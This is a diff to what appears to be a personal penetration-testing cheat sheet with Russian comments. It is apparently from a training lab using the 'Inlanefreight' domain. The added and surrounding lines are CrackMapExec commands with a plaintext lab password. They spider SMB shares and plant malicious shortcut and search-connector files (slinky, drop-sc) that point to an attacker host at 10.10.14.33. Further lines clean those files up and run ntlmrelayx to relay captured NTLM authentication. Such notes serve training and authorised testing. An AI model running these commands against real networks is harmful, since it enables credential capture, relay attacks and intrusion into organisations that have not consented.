@@ -202,11 +202,16 @@
 	mxc smb 10.129.203.121 -u grace -p Inlanefreight01! -M spider_plus -o EXCLUDE_DIR=ADMIN$,IPC$,print$,NETLOGON,SYSVOL READ_ONLY=false
 
 	# RELAY
+	
 	# рассылка линков по открытым шарам
 	proxychains4 -q crackmapexec smb 172.16.1.10 -u grace -p Inlanefreight01! -M slinky -o SERVER=10.10.14.33 NAME=important
+	proxychains4 -q crackmapexec smb 172.16.1.10 -u grace -p Inlanefreight01! -M drop-sc -o URL=\\\\10.10.14.33\\secret SHARE=IT-Tools FILENAME=secret
+	
 	# очистка
 	proxychains4 -q crackmapexec smb 172.16.1.10 -u grace -p Inlanefreight01! -M slinky -o NAME=important CLEANUP=YES
-	# ретрпнсляция
+	proxychains4 -q crackmapexec smb 172.16.1.10 -u grace -p Inlanefreight01! -M drop-sc -o CLEANUP=True FILENAME=secret
+	
+	# ретрансляция
 	sudo proxychains4 -q ntlmrelayx.py -tf relay.txt -smb2support --no-http
 
 	# Для какой учетной записи ---> password-not-required
